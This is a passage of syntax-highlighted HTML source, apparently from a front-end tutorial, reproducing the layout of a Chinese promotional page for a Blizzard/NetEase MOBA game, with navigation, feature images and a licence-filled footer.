attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>font/iconfont.css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>css/base.css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>css/index.css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>header<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/logo.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>进入官网<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>注册账号<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>游戏特色<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>游戏下载<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>main<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>slogan<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/slogan.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>list<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h3</span><span class=\"token punctuation\">&gt;</span></span>颠覆传统 MOBA 2.0<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h3</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/eye1.jpg<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h3</span><span class=\"token punctuation\">&gt;</span></span>2019年第1赛季<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h3</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/eye2.jpg<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h3</span><span class=\"token punctuation\">&gt;</span></span>2019黄金风暴联赛报名<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h3</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/eye3.jpg<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>footer<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>footer-in<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>footer-top clearfix<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fl<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>i</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>i</span><span class=\"token punctuation\">&gt;</span></span>\n                    在线客服\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>i</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>i</span><span class=\"token punctuation\">&gt;</span></span>\n                    反馈\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>i</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>i</span><span class=\"token punctuation\">&gt;</span></span>\n                    加入我们\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fr<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">&gt;</span></span>合作品牌<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>i</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>i</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>b</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>iconfont icon-jiahao<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>b</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">&gt;</span></span>|<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>b</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>iconfont icon-sanjiaodown<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>b</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>footer-middle clearfix<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fl middle-left<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/blizzard.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/163.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fl middle-right<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>隐私<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">&gt;</span></span>|<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>法律条款<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">&gt;</span></span>|<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>API<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                        ©2019 暴雪娱乐有限公司版权所有 由上海网之易网络科技发展有限公司运营 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>著作权侵权<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span> | 新广出审[2014]1356号\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                        文网进字[2014]0115号 | <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>沪网文号〔2017〕9633-727号<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span> | <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>增值电信业务经营许可证编号：沪B2－20080012<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                        互联网违法和不良信息举报电话：0571-28090163 沪公网安备 31011502022167号 | <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>上海市网络游戏行业自律公约<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/footer1.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/footer2.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/footer3.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/footer4.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/footer5.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                        | 适龄提示：适合18岁及以上使用\n                        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>家长监护工程&gt;<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n                    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token 